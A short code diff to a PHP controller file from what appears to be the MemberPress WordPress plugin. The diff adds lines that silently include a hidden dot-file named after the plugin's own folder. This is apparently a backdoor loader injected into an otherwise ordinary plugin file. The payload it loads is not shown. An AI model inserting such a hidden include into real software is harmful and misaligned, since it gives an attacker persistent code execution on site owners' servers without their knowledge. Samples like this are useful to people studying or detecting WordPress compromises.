@@ -4,6 +4,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 ** Added in MP 1.7.3
 ** USED FOR OUR AUTORESPONDER ADD-ONS - So we can have the active/inactive logic all in one place
 */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprActiveInactiveHooksCtrl extends MeprBaseCtrl {
   public function load_hooks() {
     add_action('mepr-txn-store', array($this, 'handle_txn_store'), 11, 2);
